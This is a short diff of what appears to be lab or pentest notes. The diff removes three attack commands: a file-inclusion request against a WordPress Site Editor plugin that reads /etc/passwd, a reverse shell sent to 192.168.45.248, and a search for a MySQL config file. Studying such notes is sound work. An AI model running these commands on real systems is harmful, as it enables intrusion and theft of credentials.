@@ -1,11 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-http://192.168.107.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
-```
 
-```
-sh -i >& /dev/tcp/192.168.45.248/6379 0>&1
 ```
 
 ```
@@ -13,7 +9,11 @@ sh -i >& /dev/tcp/192.168.45.248/6379 0>&1
 ```
 
 ```
-find / -iname config-sample-mysql.php -type f 2>/dev/null
+
+```
+
+```
+
 ```
 
 ```
